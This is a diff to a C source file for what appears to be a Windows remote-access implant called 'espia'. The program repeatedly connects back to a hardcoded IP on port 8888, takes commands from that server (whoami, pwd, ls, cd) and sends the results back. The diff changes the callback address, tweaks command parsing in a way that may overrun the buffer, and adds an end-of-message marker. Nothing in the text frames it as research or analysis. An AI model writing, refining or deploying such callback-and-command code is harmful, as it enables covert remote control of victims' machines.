@@ -23,7 +23,7 @@ int main() {
 
     /* Keep trying to connect to the server */
 	WORD server_status;
-	while ((server_status = espia_connect("172.22.212.209", "8888")) == CONNECTION_FAIL)
+	while ((server_status = espia_connect("172.20.139.115", "8888")) == CONNECTION_FAIL)
 		Sleep(TRY_SERVER);
     /* ------------------------------------ */
 
@@ -42,7 +42,7 @@ int main() {
 
         /* Seperate the command from argument using the whitespace (' ') */
         int i = 0;
-        for (i = 0 ; i < cmd_size - 1 ; i++) {
+        for (i = 0 ; i < cmd_size ; i++) {
             if (recv_buff[i] == ' ') {
                 cmd_buff[i] = '\0';
                 cmd_arg = recv_buff + ++i;
@@ -50,7 +50,6 @@ int main() {
             }
             cmd_buff[i] = recv_buff[i];
         }
-
 
         if (strcmp(cmd_buff, "whoami") == 0) {
             WCHAR whoami_buff[256 + MAX_COMPUTERNAME_LENGTH + 2];
@@ -64,7 +63,6 @@ int main() {
             StringCbCatW(pwd_buff, sizeof(pwd_buff), L"\n");
             espia_send(pwd_buff, wcslen(pwd_buff)*sizeof(WCHAR));
         } else if (strcmp(cmd_buff, "ls") == 0) {
-            printf("came here\n");
             ls(espia_send);
         } else if (strcmp(cmd_buff, "cd") == 0) {
             WCHAR err_buff[50];
@@ -74,6 +72,10 @@ int main() {
         } else {
             printf("%s : %d\n", recv_buff, cmd_size);
         }
+
+        WCHAR msg_end[10] = L"\0";
+        StringCbCatW(msg_end, sizeof(msg_end), L"<end>");
+        espia_send(msg_end, sizeof(msg_end));
     }
     /* ---------------------------------------------------- */
 
